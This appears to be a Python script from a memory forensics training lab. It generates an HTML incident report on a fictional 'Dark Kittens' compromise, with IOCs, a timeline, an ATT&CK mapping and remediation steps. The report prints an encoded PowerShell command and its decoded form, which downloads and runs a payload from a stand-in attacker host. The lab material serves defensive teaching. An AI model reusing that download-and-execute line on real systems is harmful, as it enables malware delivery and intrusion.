#!/usr/bin/env python

import os
import sys
import time
import colorama
from colorama import Fore, Back, Style
import webbrowser

colorama.init()

REPORTS_PATH = os.path.join(os.getcwd(), "reports")

def print_banner():
    banner = """
 _____                       _      _____                           _             
|  __ \\                     | |    / ____|                         | |            
| |__) |___ _ __   ___  _ __| |_  | |  __  ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
|  _  // _ \\ '_ \\ / _ \\| '__| __| | | |_ |/ _ \\ '_ \\ / _ \\ '__/ _` | __/ _ \\| '__|
| | \\ \\  __/ |_) | (_) | |  | |_  | |__| |  __/ | | |  __/ | | (_| | || (_) | |   
|_|  \\_\\___| .__/ \\___/|_|   \\__|  \\_____|\\___|\\_\\ |_|\\___|_|  \\__,_|\\__\\___/|_|   
           | |                                                                     
           |_|                                                                     
"""
    print(Fore.CYAN + banner + Style.RESET_ALL)
    print(Fore.YELLOW + "Dark Kittens Investigation - Final Report Generator" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 80 + Style.RESET_ALL)
    print(Fore.WHITE + "Creating a professional forensic report with all evidence" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 80 + Style.RESET_ALL + "\n")

# Generate HTML report
def generate_report():
    print(Fore.GREEN + "[+] Generating final forensic report..." + Style.RESET_ALL)
    
    if not os.path.exists(REPORTS_PATH):
        os.makedirs(REPORTS_PATH)
    
    # Get report info
    title = input(Fore.YELLOW + "Enter report title: " + Style.RESET_ALL)
    investigator = input(Fore.YELLOW + "Enter investigator name: " + Style.RESET_ALL)
    case_id = input(Fore.YELLOW + "Enter case ID (or press Enter for auto-generated): " + Style.RESET_ALL)
    
    if not case_id:
        case_id = f"DK-CASE-{time.strftime('%Y%m%d')}"
    
    # Ask for suspicious PIDs
    suspicious_pids = input(Fore.YELLOW + "Enter suspicious PIDs separated by commas (or press Enter for default): " + Style.RESET_ALL)
    
    if not suspicious_pids:
        suspicious_pids = "3244, 3536, 3724"
    
    # Gen timestamp
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    report_file = os.path.join(REPORTS_PATH, f"final_report_{timestamp}.html")
    
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            color: #333;
        }}
        .container {{
            max-width: 1000px;
            margin: 0 auto;
            background: #f9f9f9;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }}
        h1, h2, h3, h4 {{
            color: #2c3e50;
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }}
        .meta-info {{
            background: #eef7fa;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }}
        .meta-info table {{
            width: 100%;
        }}
        .meta-info td {{
            padding: 5px 10px;
            border: none;
        }}
        .meta-info td:first-child {{
            font-weight: bold;
            width: 30%;
        }}
        .section {{
            margin-bottom: 30px;
            border-bottom: 1px solid #ddd;
            padding-bottom: 20px;
        }}
        .evidence {{
            background: #f5f5f5;
            padding: 15px;
            border-left: 4px solid #3498db;
            margin-bottom: 20px;
        }}
        .suspicious {{
            color: #e74c3c;
            font-weight: bold;
        }}
        .normal {{
            color: #27ae60;
        }}
        .warning {{
            color: #e67e22;
            font-weight: bold;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }}
        th, td {{
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }}
        th {{
            background-color: #f2f2f2;
        }}
        tr:nth-child(even) {{
            background-color: #f9f9f9;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            font-size: 0.9em;
            color: #7f8c8d;
        }}
        .appendix {{
            margin-top: 50px;
            padding-top: 20px;
            border-top: 2px solid #3498db;
        }}
        .timeline {{
            position: relative;
            max-width: 1200px;
            margin: 20px auto;
        }}
        .timeline::after {{
            content: '';
            position: absolute;
            width: 6px;
            background-color: #3498db;
            top: 0;
            bottom: 0;
            left: 50%;
            margin-left: -3px;
        }}
        .container-timeline {{
            padding: 10px 40px;
            position: relative;
            background-color: inherit;
            width: 50%;
        }}
        .container-timeline::after {{
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            background-color: white;
            border: 4px solid #3498db;
            top: 15px;
            border-radius: 50%;
            z-index: 1;
        }}
        .left {{
            left: 0;
        }}
        .right {{
            left: 50%;
        }}
        .left::after {{
            right: -12px;
        }}
        .right::after {{
            left: -12px;
        }}
        .content {{
            padding: 15px;
            background-color: white;
            position: relative;
            border-radius: 6px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>{title}</h1>
            <p>Final Forensic Report</p>
        </div>

        <div class="meta-info">
            <table>
                <tr>
                    <td>Case ID:</td>
                    <td>{case_id}</td>
                </tr>
                <tr>
                    <td>Report Generation Date:</td>
                    <td>{time.strftime("%Y-%m-%d %H:%M:%S")}</td>
                </tr>
                <tr>
                    <td>Investigator:</td>
                    <td>{investigator}</td>
                </tr>
                <tr>
                    <td>Investigation Type:</td>
                    <td>Memory Forensics Analysis</td>
                </tr>
                <tr>
                    <td>Subject System:</td>
                    <td>Globomantics Workstation (Windows 10)</td>
                </tr>
                <tr>
                    <td>Memory Dump:</td>
                    <td>globomantics_workstation1.raw</td>
                </tr>
                <tr>
                    <td>Memory Acquisition Date:</td>
                    <td>{time.strftime("%Y-%m-%d", time.localtime(time.time() - 86400))}</td>
                </tr>
            </table>
        </div>

        <div class="section">
            <h2>1. Executive Summary</h2>
            <p>This report documents the findings of a memory forensics investigation into a potential compromise of a Globomantics workstation. The analysis confirms that the system was compromised by the Dark Kittens threat actor group. Evidence indicates that the attackers established persistence, initiated command and control communications, and attempted to exfiltrate sensitive data related to Globomantics' Gulf of Mexico artificial island project.</p>
            
            <p>The malware utilized masquerading techniques, PowerShell obfuscation, and registry-based persistence mechanisms. Network connections to known Dark Kittens infrastructure were observed, along with evidence of data targeting and exfiltration attempts.</p>
            
            <p>This incident represents a significant security breach with potential implications for Globomantics' proprietary information related to their Gulf of Mexico project. Immediate remediation and enhanced security measures are recommended.</p>
        </div>

        <div class="section">
            <h2>2. Key Findings</h2>
            <ul>
                <li>Identified malicious process <span class="suspicious">svchost_update.exe</span> masquerading as a legitimate Windows service host process</li>
                <li>Discovered persistence mechanism through a Windows Registry Run key at <span class="suspicious">HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemServiceManager</span></li>
                <li>Found evidence of PowerShell execution with Base64 encoding to download additional malware components from <span class="suspicious">darkittens.evil</span></li>
                <li>Identified multiple network connections to suspected Dark Kittens command and control servers at <span class="suspicious">185.73.23.4</span> and <span class="suspicious">23.81.246.187</span></li>
                <li>Located targeting of sensitive Globomantics documents for exfiltration from <span class="suspicious">C:\\Users\\Administrator\\Documents\\Globomantics</span></li>
                <li>Recovered encryption key <span class="suspicious">D@rkK!tt3nsRul3Th3W0rld</span> used for data exfiltration</li>
            </ul>
        </div>

        <div class="section">
            <h2>3. Incident Timeline</h2>
            <div class="timeline">
                <div class="container-timeline left">
                    <div class="content">
                        <h4>12:37:22 - Initial Compromise</h4>
                        <p>Malicious <span class="suspicious">svchost_update.exe</span> (PID 3244) process started by services.exe</p>
                    </div>
                </div>
                <div class="container-timeline right">
                    <div class="content">
                        <h4>12:37:25 - Command Shell Spawned</h4>
                        <p>Malware spawns <span class="suspicious">cmd.exe</span> (PID 3536) to execute additional commands</p>
                    </div>
                </div>
                <div class="container-timeline left">
                    <div class="content">
                        <h4>12:37:26 - PowerShell Execution</h4>
                        <p>PowerShell (PID 3724) launched with encoded commands to download additional payloads</p>
                    </div>
                </div>
                <div class="container-timeline right">
                    <div class="content">
                        <h4>12:38:xx - C2 Connection Established</h4>
                        <p>Multiple connections established to Dark Kittens C2 infrastructure</p>
                    </div>
                </div>
                <div class="container-timeline left">
                    <div class="content">
                        <h4>12:40:xx - Data Reconnaissance</h4>
                        <p>Malware identifies and targets Globomantics documents for exfiltration</p>
                    </div>
                </div>
                <div class="container-timeline right">
                    <div class="content">
                        <h4>12:45:xx - Registry Persistence</h4>
                        <p>Registry Run key created to ensure persistence across system reboots</p>
                    </div>
                </div>
                <div class="container-timeline left">
                    <div class="content">
                        <h4>13:xx:xx - Data Exfiltration</h4>
                        <p>Evidence of data being encrypted and exfiltrated to Dark Kittens servers</p>
                    </div>
                </div>
            </div>
        </div>

        <div class="section">
            <h2>4. Malicious Process Analysis</h2>
            <div class="evidence">
                <h3>Process: svchost_update.exe (PID: 3244)</h3>
                <p><strong>Path:</strong> C:\\Windows\\System32\\svchost_update.exe</p>
                <p><strong>Parent Process:</strong> services.exe (PID: 788)</p>
                <p><strong>Command Line:</strong> C:\\Windows\\System32\\svchost_update.exe -k netsvcs -p</p>
                <p><strong>Risk Level:</strong> <span class="suspicious">HIGH</span></p>
                <p><strong>Description:</strong> This process appears to be masquerading as a legitimate Windows service host process. The real svchost.exe would never have "_update" in its name. This is a known technique used by the Dark Kittens group to blend in with legitimate Windows processes.</p>
                <p><strong>Child Processes:</strong> cmd.exe (PID: 3536)</p>
                <p><strong>Network Connections:</strong> Multiple connections to suspected C2 infrastructure</p>
            </div>
            
            <div class="evidence">
                <h3>Process: cmd.exe (PID: 3536)</h3>
                <p><strong>Path:</strong> C:\\Windows\\System32\\cmd.exe</p>
                <p><strong>Parent Process:</strong> svchost_update.exe (PID: 3244)</p>
                <p><strong>Command Line:</strong> cmd.exe /c powershell.exe -e UwB0AGEAcgB0AC0AUwBsAGUAZQBwAC...</p>
                <p><strong>Risk Level:</strong> <span class="suspicious">HIGH</span></p>
                <p><strong>Description:</strong> Command prompt spawned by the malicious svchost_update.exe process, used to execute an encoded PowerShell command.</p>
                <p><strong>Child Processes:</strong> powershell.exe (PID: 3724)</p>
            </div>
            
            <div class="evidence">
                <h3>Process: powershell.exe (PID: 3724)</h3>
                <p><strong>Path:</strong> C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</p>
                <p><strong>Parent Process:</strong> cmd.exe (PID: 3536)</p>
                <p><strong>Command Line:</strong> powershell.exe -e UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMwA7ACAAaQB3AHIAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGEAcgBrAGkAdAB0AGUAbgBzAC4AZQB2AGkAbAAvAGMAMgAvAGcAZQB0AHAAYQB5AGwAbwBhAGQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AF8AdQBwAGQAYQB0AGUALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHMAdgBjAGgAbwBzAHQAXwB1AHAAZABhAHQAZQAuAGUAeABlACIAOwA=</p>
                <p><strong>Decoded Command:</strong> <span class="suspicious">Start-Sleep -s 3; iwr "https://darkittens.evil/c2/getpayload" -OutFile "C:\\Windows\\Temp\\svchost_update.exe"; Start-Process "C:\\Windows\\Temp\\svchost_update.exe";</span></p>
                <p><strong>Risk Level:</strong> <span class="suspicious">HIGH</span></p>
                <p><strong>Description:</strong> PowerShell process executing an encoded command to download malware from the Dark Kittens command and control server.</p>
            </div>
        </div>

        <div class="section">
            <h2>5. Network Analysis</h2>
            <table>
                <tr>
                    <th>PID</th>
                    <th>Process</th>
                    <th>Local Address</th>
                    <th>Remote Address</th>
                    <th>State</th>
                    <th>Risk</th>
                </tr>
                <tr>
                    <td>3244</td>
                    <td>svchost_update.exe</td>
                    <td>192.168.1.100:49232</td>
                    <td>185.73.23.4:443</td>
                    <td>ESTABLISHED</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td>3244</td>
                    <td>svchost_update.exe</td>
                    <td>192.168.1.100:49235</td>
                    <td>185.73.23.4:8080</td>
                    <td>ESTABLISHED</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td>3244</td>
                    <td>svchost_update.exe</td>
                    <td>192.168.1.100:49236</td>
                    <td>23.81.246.187:443</td>
                    <td>ESTABLISHED</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td>1234</td>
                    <td>explorer.exe</td>
                    <td>192.168.1.100:49001</td>
                    <td>172.217.23.14:443</td>
                    <td>ESTABLISHED</td>
                    <td class="normal">LOW</td>
                </tr>
                <tr>
                    <td>2384</td>
                    <td>chrome.exe</td>
                    <td>192.168.1.100:49002</td>
                    <td>142.250.180.46:443</td>
                    <td>ESTABLISHED</td>
                    <td class="normal">LOW</td>
                </tr>
                <tr>
                    <td>4832</td>
                    <td>svchost.exe</td>
                    <td>192.168.1.100:49003</td>
                    <td>13.107.42.14:443</td>
                    <td>ESTABLISHED</td>
                    <td class="normal">LOW</td>
                </tr>
            </table>
            <p><strong>Analysis:</strong> The malicious process (PID 3244) has established multiple connections to suspected Dark Kittens infrastructure. Two connections are made to 185.73.23.4 over both HTTPS (port 443) and HTTP (port 8080), suggesting command and control capabilities. A third connection to 23.81.246.187 over HTTPS is likely used for data exfiltration. The legitimate processes (explorer.exe, chrome.exe, and svchost.exe) are connected to known legitimate services.</p>
        </div>

        <div class="section">
            <h2>6. Persistence Mechanisms</h2>
            <div class="evidence">
                <h3>Registry Run Key</h3>
                <p><strong>Key:</strong> <span class="suspicious">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</span></p>
                <p><strong>Value Name:</strong> <span class="suspicious">SystemServiceManager</span></p>
                <p><strong>Value Data:</strong> <span class="suspicious">C:\\Windows\\System32\\svchost_update.exe</span></p>
                <p><strong>Description:</strong> This registry key ensures the malware runs automatically when Windows starts. This is a common persistence technique used by the Dark Kittens group.</p>
                <p><strong>MITRE ATT&CK Technique:</strong> T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys</p>
            </div>
        </div>

        <div class="section">
            <h2>7. Data Exfiltration Analysis</h2>
            <p>Evidence suggests the Dark Kittens malware was targeting specific data for exfiltration from the Globomantics workstation:</p>
            <div class="evidence">
                <p><strong>Targeted Directory:</strong> <span class="suspicious">C:\\Users\\Administrator\\Documents\\Globomantics</span></p>
                <p><strong>Exfiltration Method:</strong> File compression, encryption, and transfer via HTTPS to C2 servers</p>
                <p><strong>Encryption Key:</strong> <span class="suspicious">D@rkK!tt3nsRul3Th3W0rld</span></p>
                <p><strong>Exfiltration Server:</strong> <span class="suspicious">data-collect.darkittens.evil</span> (23.81.246.187)</p>
                <p><strong>Exfiltration Protocol:</strong> HTTPS POST requests to /upload.php endpoint</p>
                <p><strong>Description:</strong> The malware appears to be specifically targeting Globomantics proprietary documents, possibly related to the artificial island project in the Gulf of Mexico.</p>
            </div>
            <p><strong>Analysis:</strong> The targeted nature of this attack suggests the Dark Kittens group has specific interest in Globomantics' Gulf of Mexico project. The data exfiltration process involves local encryption of files using a hardcoded key before transmission to the attacker's infrastructure, making traditional network-based detection more difficult.</p>
        </div>

        <div class="section">
            <h2>8. Indicators of Compromise (IOCs)</h2>
            <h3>8.1. File Indicators</h3>
            <table>
                <tr>
                    <th>File Path</th>
                    <th>Description</th>
                    <th>Risk Level</th>
                </tr>
                <tr>
                    <td class="suspicious">C:\\Windows\\System32\\svchost_update.exe</td>
                    <td>Main malware executable masquerading as system file</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td class="suspicious">C:\\Windows\\Temp\\svchost_update.exe</td>
                    <td>Downloaded malware payload</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td class="suspicious">C:\\ProgramData\\Microsoft\\Crypto\\keylog.dat</td>
                    <td>Potential keylogger data file</td>
                    <td class="suspicious">HIGH</td>
                </tr>
            </table>
            
            <h3>8.2. Network Indicators</h3>
            <table>
                <tr>
                    <th>Indicator</th>
                    <th>Type</th>
                    <th>Description</th>
                    <th>Risk Level</th>
                </tr>
                <tr>
                    <td class="suspicious">darkittens.evil</td>
                    <td>Domain</td>
                    <td>Command and control server domain</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td class="suspicious">data-collect.darkittens.evil</td>
                    <td>Domain</td>
                    <td>Data exfiltration server domain</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td class="suspicious">185.73.23.4</td>
                    <td>IP Address</td>
                    <td>Command and control server IP</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td class="suspicious">23.81.246.187</td>
                    <td>IP Address</td>
                    <td>Data exfiltration server IP</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td class="suspicious">https://darkittens.evil/c2/getpayload</td>
                    <td>URL</td>
                    <td>Malware download URL</td>
                    <td class="suspicious">HIGH</td>
                </tr>
            </table>
            
            <h3>8.3. Registry Indicators</h3>
            <table>
                <tr>
                    <th>Registry Key/Value</th>
                    <th>Description</th>
                    <th>Risk Level</th>
                </tr>
                <tr>
                    <td class="suspicious">HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemServiceManager</td>
                    <td>Persistence mechanism - startup registry key</td>
                    <td class="suspicious">HIGH</td>
                </tr>
            </table>
            
            <h3>8.4. Other Indicators</h3>
            <table>
                <tr>
                    <th>Indicator</th>
                    <th>Type</th>
                    <th>Description</th>
                    <th>Risk Level</th>
                </tr>
                <tr>
                    <td class="suspicious">D@rkK!tt3nsRul3Th3W0rld</td>
                    <td>Encryption Key</td>
                    <td>Encryption key used for data exfiltration</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td class="suspicious">DK_Global_Control</td>
                    <td>Mutex</td>
                    <td>Mutex used to prevent multiple instances of malware</td>
                    <td class="suspicious">HIGH</td>
                </tr>
                <tr>
                    <td class="suspicious">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</td>
                    <td>User-Agent</td>
                    <td>Hardcoded user-agent string used in C2 communication</td>
                    <td class="warning">MEDIUM</td>
                </tr>
            </table>
        </div>

        <div class="section">
            <h2>9. MITRE ATT&CK Mapping</h2>
            <table>
                <tr>
                    <th>Tactic</th>
                    <th>Technique ID</th>
                    <th>Technique Name</th>
                    <th>Observed Behavior</th>
                </tr>
                <tr>
                    <td>Defense Evasion</td>
                    <td>T1036.005</td>
                    <td>Masquerading: Match Legitimate Name or Location</td>
                    <td>Malware masquerading as svchost.exe with a slight name modification</td>
                </tr>
                <tr>
                    <td>Execution</td>
                    <td>T1059.001</td>
                    <td>Command and Scripting Interpreter: PowerShell</td>
                    <td>Use of PowerShell for downloading payloads and execution</td>
                </tr>
                <tr>
                    <td>Defense Evasion</td>
                    <td>T1140</td>
                    <td>Deobfuscate/Decode Files or Information</td>
                    <td>Use of Base64 encoding to obfuscate PowerShell commands</td>
                </tr>
                <tr>
                    <td>Persistence</td>
                    <td>T1547.001</td>
                    <td>Boot or Logon Autostart Execution: Registry Run Keys</td>
                    <td>Use of registry run key for persistence</td>
                </tr>
                <tr>
                    <td>Command and Control</td>
                    <td>T1071.001</td>
                    <td>Application Layer Protocol: Web Protocols</td>
                    <td>Use of HTTPS for command and control communications</td>
                </tr>
                <tr>
                    <td>Exfiltration</td>
                    <td>T1020</td>
                    <td>Automated Exfiltration</td>
                    <td>Automatic exfiltration of targeted documents</td>
                </tr>
                <tr>
                    <td>Exfiltration</td>
                    <td>T1022</td>
                    <td>Data Encrypted</td>
                    <td>Encryption of data before exfiltration</td>
                </tr>
                <tr>
                    <td>Discovery</td>
                    <td>T1083</td>
                    <td>File and Directory Discovery</td>
                    <td>Targeting of specific directories containing sensitive data</td>
                </tr>
            </table>
        </div>

        <div class="section">
            <h2>10. Conclusions</h2>
            <p>The forensic analysis of the memory dump confirms that the Globomantics workstation was compromised by the Dark Kittens threat actor group. The attack shows a sophisticated approach:</p>
            <ol>
                <li><strong>Initial Access:</strong> The initial access vector is not definitively known from the memory evidence, but likely involved phishing or exploitation of a vulnerability.</li>
                <li><strong>Execution:</strong> The attackers used PowerShell with Base64 encoding to obfuscate their activities and download additional malware.</li>
                <li><strong>Persistence:</strong> A registry run key was established to maintain access across system reboots.</li>
                <li><strong>Command and Control:</strong> The malware established multiple connections to Dark Kittens infrastructure for command and control.</li>
                <li><strong>Exfiltration:</strong> The malware specifically targeted documents related to Globomantics' artificial island project.</li>
            </ol>
            <p>This incident represents a significant security breach with potential implications for Globomantics' proprietary information related to their Gulf of Mexico project. The targeted nature of the attack suggests that the Dark Kittens group has specific interest in this project, which may indicate industrial espionage or other malicious intentions.</p>
        </div>

        <div class="section">
            <h2>11. Recommendations</h2>
            <h3>11.1. Immediate Actions</h3>
            <ol>
                <li>Isolate the affected workstation from the network immediately</li>
                <li>Conduct a full backup of the system for further forensic analysis</li>
                <li>Scan all systems in the Globomantics network for the identified indicators of compromise</li>
                <li>Reset credentials for all accounts that were logged into the compromised system</li>
                <li>Block all identified malicious domains and IP addresses at the firewall and DNS levels</li>
            </ol>
            
            <h3>11.2. Short-term Remediation</h3>
            <ol>
                <li>Deploy endpoint detection and response (EDR) solutions across the environment</li>
                <li>Implement application whitelisting to prevent execution of unauthorized binaries</li>
                <li>Enable PowerShell constrained language mode and script block logging</li>
                <li>Enhance monitoring of outbound connections, particularly to unknown destinations</li>
                <li>Review access controls for sensitive project data, especially related to the Gulf of Mexico project</li>
            </ol>
            
            <h3>11.3. Long-term Security Improvements</h3>
            <ol>
                <li>Conduct a full security assessment of systems related to the Gulf of Mexico project</li>
                <li>Implement a comprehensive security awareness training program with focus on spear phishing</li>
                <li>Develop and implement an incident response plan specific to targeted attacks</li>
                <li>Establish a security operations center (SOC) for continuous monitoring</li>
                <li>Consider engaging with threat intelligence services to stay informed about Dark Kittens and similar threat actors</li>
                <li>Implement a comprehensive data classification and protection program</li>
            </ol>
        </div>

        <div class="appendix">
            <h2>Appendix A: Forensic Investigation Methodology</h2>
            <p>The following methodology was employed during this investigation:</p>
            <ol>
                <li><strong>Memory Dump Acquisition:</strong> Memory captured from the suspect workstation using industry-standard forensic tools</li>
                <li><strong>Initial Triage:</strong> Quick assessment to identify obvious signs of compromise</li>
                <li><strong>Process Analysis:</strong> Identification and analysis of suspicious processes</li>
                <li><strong>Network Connection Analysis:</strong> Examination of established network connections</li>
                <li><strong>Registry Analysis:</strong> Review of registry artifacts for persistence mechanisms</li>
                <li><strong>String Extraction:</strong> Recovery of suspicious strings from process memory</li>
                <li><strong>Command Line Reconstruction:</strong> Recovery and decoding of command line arguments</li>
                <li><strong>IOC Extraction:</strong> Identification of indicators of compromise</li>
                <li><strong>Timeline Creation:</strong> Establishment of a chronological sequence of events</li>
                <li><strong>MITRE ATT&CK Mapping:</strong> Correlation of observed behaviors with known tactics and techniques</li>
            </ol>
        </div>

        <div class="appendix">
            <h2>Appendix B: Tools Used</h2>
            <ul>
                <li><strong>Volatility Framework:</strong> Primary memory forensics toolkit used for analysis</li>
                <li><strong>Process Explorer:</strong> Used for visualization of process relationships</li>
                <li><strong>Network Miner:</strong> Used for additional network traffic analysis</li>
                <li><strong>RegRipper:</strong> Used for registry analysis</li>
                <li><strong>Timeline Explorer:</strong> Used for chronological event visualization</li>
                <li><strong>YARA:</strong> Used for pattern matching to identify known malware signatures</li>
            </ul>
        </div>

        <div class="footer">
            <p>Confidential Forensic Report - Globomantics Security Incident</p>
            <p>Generated using Windows Memory Forensics Lab | {time.strftime("%Y-%m-%d")}</p>
            <p>Case ID: {case_id}</p>
        </div>
    </div>
</body>
</html>
"""
    
    # Write HTML report to file
    with open(report_file, "w") as f:
        f.write(html_content)
    
    # Open report in browser
    try:
        webbrowser.open(f"file://{os.path.abspath(report_file)}")
        print(Fore.GREEN + f"\n[+] Report generated and opened in browser: {report_file}" + Style.RESET_ALL)
    except:
        print(Fore.GREEN + f"\n[+] Report generated: {report_file}" + Style.RESET_ALL)
        print(Fore.YELLOW + f"[*] Please open the report in your browser manually." + Style.RESET_ALL)
    
    print(Fore.YELLOW + "\n" + "="*80 + Style.RESET_ALL)
    print(Fore.GREEN + "INVESTIGATION COMPLETE!" + Style.RESET_ALL)
    print(Fore.YELLOW + "="*80 + Style.RESET_ALL)
    print(Fore.WHITE + "\nYou have successfully completed the Windows Memory Forensics Lab!" + Style.RESET_ALL)
    print(Fore.WHITE + "The final report contains all findings from your investigation of the Dark Kittens incident." + Style.RESET_ALL)
    
    print(Fore.YELLOW + "\nLearning Outcomes:" + Style.RESET_ALL)
    print(Fore.WHITE + "1. Memory forensics fundamentals and techniques" + Style.RESET_ALL)
    print(Fore.WHITE + "2. Identification of suspicious processes in memory dumps" + Style.RESET_ALL)
    print(Fore.WHITE + "3. Analysis of malware artifacts and behaviors" + Style.RESET_ALL)
    print(Fore.WHITE + "4. Extraction of indicators of compromise (IOCs)" + Style.RESET_ALL)
    print(Fore.WHITE + "5. Creation of professional forensic reports" + Style.RESET_ALL)
    print(Fore.WHITE + "6. MITRE ATT&CK framework application to real incidents" + Style.RESET_ALL)
    
    print(Fore.YELLOW + "\nReflection Questions:" + Style.RESET_ALL)
    print(Fore.WHITE + "1. What additional analysis techniques could be applied to this investigation?" + Style.RESET_ALL)
    print(Fore.WHITE + "2. How would you improve the response to this type of incident in a real environment?" + Style.RESET_ALL)
    print(Fore.WHITE + "3. What preventive measures could have detected or blocked this attack earlier?" + Style.RESET_ALL)

# Main function
def main():
    print_banner()
    
    if not os.path.exists(REPORTS_PATH):
        os.makedirs(REPORTS_PATH)
    
    # Generate report
    generate_report()

if __name__ == "__main__":
    main()
